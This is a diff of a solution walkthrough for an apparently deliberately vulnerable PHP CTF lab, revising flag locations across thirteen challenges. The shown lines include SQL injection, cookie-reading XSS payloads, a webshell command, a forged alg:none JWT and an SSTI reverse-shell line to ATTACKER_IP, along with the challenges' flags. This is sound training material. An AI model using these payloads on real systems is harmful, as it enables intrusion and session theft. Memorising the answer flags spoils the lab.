@@ -34,7 +34,8 @@
 ## Challenge 1 — SQL Injection (Easy · 100pts)
 
 **Target Page:** `/challenge/login_legacy.php`  
-**Vulnerability:** User input is concatenated directly into an SQL query with no sanitization.
+**Flag Location:** `/challenge/dashboard.php` (after successful SQLi login)  
+**Chain:** `SQLi bypass` → `login` → `navigate to dashboard` → `flag`
 
 ### Reconnaissance
 
@@ -70,7 +71,14 @@ Neither `$username` nor `$password` are sanitized or parameterised.
    Because `'1'='1'` is always true, the query returns the first user row (admin).
 6. The page displays:
    ```
-   Login successful! Welcome admin. Here's your reward: CCEE{sql_1nj3ct10n_m4st3r}
+   Login successful! Welcome admin. Proceed to your Dashboard to access sensitive data.
+   ```
+7. **Click the Dashboard link** (or navigate to `/challenge/dashboard.php`).
+8. The dashboard displays the flag banner:
+   ```
+   🎉 SQL Injection Successful!
+   You bypassed authentication via SQL Injection.
+   Flag: CCEE{sql_1nj3ct10n_m4st3r}
    ```
 
 ### Alternative Payloads
@@ -88,7 +96,8 @@ Neither `$username` nor `$password` are sanitized or parameterised.
 ## Challenge 2 — Reflected XSS (Easy · 100pts)
 
 **Target Page:** `/challenge/about.php`  
-**Vulnerability:** The `member` GET parameter is echoed into the page without any sanitization.
+**Flag Location:** Browser cookie `xss_reward`  
+**Chain:** `inject XSS payload` → `XSS detected` → `check browser cookies` → `flag`
 
 ### Reconnaissance
 
@@ -108,18 +117,22 @@ Neither `$username` nor `$password` are sanitized or parameterised.
    ```
 2. Open the URL in your browser.
 3. The JavaScript executes (alert box pops up).
-4. The server detects the XSS keywords (`<script`, `onerror`, `onload`, `javascript:`) and renders the flag in a green banner above the payload output:
+4. The server detects the XSS and displays a hint:
    ```
-   🎉 XSS Detected! Flag: CCEE{xss_r3fl3ct3d_4tt4ck}
+   🎉 XSS Detected! Your reward has been set — check your browser cookies.
    ```
+5. **Open DevTools** → **Application** tab → **Cookies** → look for the cookie named `xss_reward`.
+6. The cookie value contains the flag: `CCEE{xss_r3fl3ct3d_4tt4ck}`
 
 ### Alternative Payloads
 
 ```
-about.php?member=<img src=x onerror=alert(1)>
+about.php?member=<img src=x onerror=alert(document.cookie)>
 about.php?member=<svg onload=alert(document.cookie)>
 about.php?member=<body onload=alert('XSS')>
 ```
+
+> **Why cookies?** In a real XSS attack, the goal is often to steal session cookies. This challenge teaches you to look where XSS payloads actually exfiltrate data.
 
 ### 🏁 Flag: `CCEE{xss_r3fl3ct3d_4tt4ck}`
 
@@ -128,7 +141,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 3 — Stored XSS (Easy · 100pts)
 
 **Target Page:** `/challenge/contact.php`  
-**Vulnerability:** Contact form messages are stored in the database and displayed in the "Public Feedback" section without sanitization.
+**Flag Location:** Browser cookie `stored_xss_reward`  
+**Chain:** `submit XSS in contact form` → `payload stored` → `XSS detected on render` → `check browser cookies` → `flag`
 
 ### Reconnaissance
 
@@ -151,12 +165,13 @@ about.php?member=<body onload=alert('XSS')>
      ```
 3. Click **Send Message**.
 4. After submission, the page reloads and the Public Feedback section now includes your message.
-5. The `<script>` tag executes, and the server detects the stored XSS pattern in the database.
-6. A green flag card appears in the Public Feedback grid:
+5. The `<script>` tag executes, and the server detects the stored XSS pattern.
+6. A hint card appears:
    ```
-   🎉 XSS Detected!
-   Flag: CCEE{st0r3d_xss_1n_c0nt4ct}
+   🎉 XSS Detected! Your reward has been set — check your browser cookies.
    ```
+7. **Open DevTools** → **Application** tab → **Cookies** → look for the cookie named `stored_xss_reward`.
+8. The cookie value contains the flag: `CCEE{st0r3d_xss_1n_c0nt4ct}`
 
 ### Alternative Payloads
 
@@ -172,7 +187,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 4 — IDOR: Insecure Direct Object Reference (Easy · 100pts)
 
 **Target Page:** `/challenge/view_message.php`  
-**Vulnerability:** Messages are fetched by ID with no authorization check — any logged-in user can view any message, including private admin messages.
+**Flag Location:** Message ID 1 (private admin message)  
+**Chain:** `login as any user` → `enumerate message IDs` → `access ?id=1` → `flag`
 
 ### Reconnaissance
 
@@ -208,7 +224,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 5 — Information Disclosure (Easy · 50pts)
 
 **Target Page:** `/challenge/config.php.bak` and `/challenge/robots.txt`  
-**Vulnerability:** A backup configuration file containing credentials and a flag is publicly accessible on the web server.
+**Flag Location:** Inside the backup file contents  
+**Chain:** `discover robots.txt` → `find config.php.bak path` → `read backup` → `flag`
 
 ### Reconnaissance
 
@@ -246,7 +263,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 6 — HTTP Header Leak (Easy · 50pts)
 
 **Target Page:** `/challenge/dashboard.php`  
-**Vulnerability:** A custom HTTP response header `X-Custom-Flag` leaks the flag to anyone who inspects the response headers.
+**Flag Location:** HTTP response header `X-Custom-Flag`  
+**Chain:** `login` → `visit dashboard` → `inspect response headers` → `flag`
 
 ### Reconnaissance
 
@@ -288,7 +306,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 7 — Local File Inclusion / LFI (Medium · 200pts)
 
 **Target Page:** `/challenge/admin.php`  
-**Vulnerability:** The `file` GET parameter is passed directly to `include()` and `readfile()`, allowing arbitrary file reads via PHP stream wrappers.
+**Flag Location:** Hidden in `includes/config.php` source (requires base64 decode)  
+**Chain:** `login as admin` → `use php://filter on ?file= param` → `decode base64 output` → `flag`
 
 ### Reconnaissance
 
@@ -346,7 +365,8 @@ about.php?member=<body onload=alert('XSS')>
 ## Challenge 8 — PHP Object Injection (Medium · 200pts)
 
 **Target Page:** `/challenge/login.php`  
-**Vulnerability:** The `session_token` cookie is base64-decoded and then passed to `unserialize()` without validation, allowing an attacker to craft a serialized `UserSession` object with admin privileges.
+**Flag Location:** `/challenge/admin.php?file=admin_settings` (Settings panel)  
+**Chain:** `craft serialized cookie` → `access admin panel` → `navigate to Settings` → `flag`
 
 ### Reconnaissance
 
@@ -406,9 +426,15 @@ if ($session && $session->isValid && $session->role === 'admin') {
    - **Path:** `/`
 5. Navigate to `/challenge/login.php` (or refresh the page).
 6. The `__wakeup()` magic method fires, sets `isValid = true`, and the code redirects you to the **Admin Panel**.
-7. The admin panel shows a green banner:
+7. The admin panel shows a **warning banner**:
    ```
-   🎉 Congratulations! You accessed the admin panel via cookie manipulation!
+   🔓 Cookie Exploit Detected! You accessed the admin panel via cookie manipulation.
+   Navigate to Settings to claim your reward.
+   ```
+8. **Click the "Settings" link** in the sidebar (or the link in the banner).
+9. The Settings page displays the flag:
+   ```
+   🎉 Congratulations! You exploited PHP Object Injection to reach the admin settings.
    Flag: CCEE{c00k13_m0nst3r_4dm1n}
    ```
 
@@ -426,7 +452,8 @@ curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiY
 ## Challenge 9 — Logic Flaw (Medium · 150pts)
 
 **Target Page:** `/challenge/shop.php`  
-**Vulnerability:** The quantity field accepts negative values. A negative quantity results in a negative cost, which is subtracted from your balance — effectively *adding* credits.
+**Flag Location:** Shown after purchasing the "CTF Flag" item  
+**Chain:** `login` → `exploit negative quantity to gain credits` → `buy the $1M flag item` → `flag`
 
 ### Reconnaissance
 
@@ -464,7 +491,8 @@ curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiY
 ## Challenge 10 — Cross-Site Request Forgery / CSRF (Medium · 150pts)
 
 **Target Page:** `/challenge/profile.php`  
-**Vulnerability:** All profile-modifying forms (password change, email change, credit transfer) have **no CSRF tokens** and no `SameSite` cookie attribute.
+**Flag Location:** HTML source comment of `profile.php`  
+**Chain:** `identify missing CSRF tokens` → `craft exploit page` → `execute on victim` → `inspect page source for flag`
 
 ### Reconnaissance
 
@@ -502,7 +530,7 @@ curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiY
    ```
 3. Open this HTML file in the **same browser** where the victim is logged in.
 4. The hidden form auto-submits — the victim's password is now `hacked123`.
-5. The flag is documented in the page's HTML source comment:
+5. **View the page source** of `profile.php` — the flag is in the HTML comment:
    ```html
    <!-- Flag: CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n} -->
    ```
@@ -522,7 +550,8 @@ curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiY
 ## Challenge 11 — Unrestricted File Upload → RCE (Medium · 150pts)
 
 **Target Page:** `/challenge/careers.php`  
-**Vulnerability:** The file upload has **zero validation** — no extension check, no MIME check, no file renaming. Uploads go to a web-accessible `uploads/` directory with PHP execution enabled.
+**Flag Location:** `includes/upload_flag.txt` (read via uploaded webshell)  
+**Chain:** `upload PHP webshell` → `access uploaded file` → `execute command to read flag file` → `flag`
 
 ### Reconnaissance
 
@@ -588,7 +617,8 @@ curl "http://<TARGET>/challenge/uploads/shell.php?cmd=cat%20includes/upload_flag
 ## Challenge 12 — Server-Side Template Injection / SSTI (Hard · 250pts)
 
 **Target Page:** `/challenge/newsletter.php?mode=preview`  
-**Vulnerability:** The custom template engine uses `eval()` on user-controlled expressions via `${...}` and `{{= ... }}` syntax, enabling arbitrary PHP code execution.
+**Flag Location:** `includes/ssti_flag.txt` (read via template code execution)  
+**Chain:** `discover ?mode=preview` → `confirm code exec with ${7*7}` → `read flag file via ${file_get_contents(...)}` → `flag`
 
 ### Reconnaissance
 
@@ -656,7 +686,10 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
 ## Challenge 13 — JWT Exploitation (Hard · 250pts)
 
 **Target Page:** `/challenge/jwt_demo.php` and `/challenge/api/auth.php`  
-**Vulnerabilities:**
+**Flag Location:** `/challenge/api/auth.php?action=admin_data` (restricted endpoint)  
+**Chain:** `login as guest` → `decode JWT` → `forge admin token (alg:none)` → `confirm admin via ?action=profile` → `access ?action=admin_data` → `flag`
+
+### Vulnerabilities:
 1. Algorithm Confusion — accepts `"alg": "none"` (skips signature verification)
 2. Weak Secret — `supersecretkey123` (brute-forceable)
 3. No Token Expiration — stolen tokens work forever
@@ -669,7 +702,7 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
    ```bash
    curl http://<TARGET>/challenge/api/auth.php
    ```
-   Response lists available endpoints and an example login payload.
+   Response lists available endpoints including the restricted `admin_data` endpoint.
 
 ### Exploitation — Method 1: Algorithm "none" Attack
 
@@ -685,7 +718,7 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
    ```json
    {
      "success": true,
-     "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3...signature..."
+     "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lk..."
    }
    ```
 
@@ -696,9 +729,6 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
    ```bash
    echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
    # {"typ":"JWT","alg":"HS256"}
-   
-   echo "eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3...}" | base64 -d
-   # {"user_id":3,"username":"guest","role":"user","iat":17...}
    ```
 
 **Step 3: Forge a new token**
@@ -724,7 +754,7 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ.
    ```
 
-**Step 4: Use the forged token**
+**Step 4: Confirm admin access**
 
 8. Request the admin profile with the forged token:
    ```bash
@@ -736,8 +766,28 @@ ${shell_exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')}
    {
      "success": true,
      "message": "Welcome, Admin!",
+     "data": { "user_id": 1, "username": "admin", "role": "admin" },
+     "next_step": "Admin access confirmed. Access the restricted endpoint: /api/auth.php?action=admin_data for classified information."
+   }
+   ```
+
+**Step 5: Access the restricted endpoint**
+
+9. Use the same forged token to hit the `admin_data` endpoint:
+   ```bash
+   curl -s "http://<TARGET>/challenge/api/auth.php?action=admin_data" \
+        -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxMjM0NTY3ODkwfQ."
+   ```
+   Response:
+   ```json
+   {
+     "success": true,
+     "message": "Classified admin data retrieved.",
      "flag": "CCEE{jwt_4lg0r1thm_c0nfus10n_4tt4ck}",
-     "secret_info": "You have unlocked admin access via JWT manipulation!"
+     "classified": {
+       "internal_api_keys": "REDACTED",
+       "admin_notes": "JWT security review still pending..."
+     }
    }
    ```
 
@@ -771,8 +821,9 @@ challenge/
 ├── contact.php            # Stored XSS (Challenge 3)
 ├── login_legacy.php       # SQL Injection (Challenge 1)
 ├── login.php              # PHP Object Injection (Challenge 8)
-├── dashboard.php          # HTTP Header Leak (Challenge 6)
-├── admin.php              # LFI (Challenge 7)
+├── dashboard.php          # SQLi flag + HTTP Header Leak (Challenges 1,6)
+├── admin.php              # LFI + ObjInj hint (Challenges 7,8)
+├── admin_settings.php     # ObjInj flag (Challenge 8)
 ├── view_message.php       # IDOR (Challenge 4)
 ├── shop.php               # Logic Flaw (Challenge 9)
 ├── profile.php            # CSRF (Challenge 10)
@@ -784,7 +835,7 @@ challenge/
 ├── robots.txt             # Hints: hidden endpoints
 ├── config.php.bak         # Info Disclosure (Challenge 5)
 ├── api/
-│   ├── auth.php           # JWT API (Challenge 13)
+│   ├── auth.php           # JWT API + admin_data endpoint (Challenge 13)
 │   ├── search.php         # Search API
 │   └── scoreboard.php     # CTF scoreboard
 ├── includes/
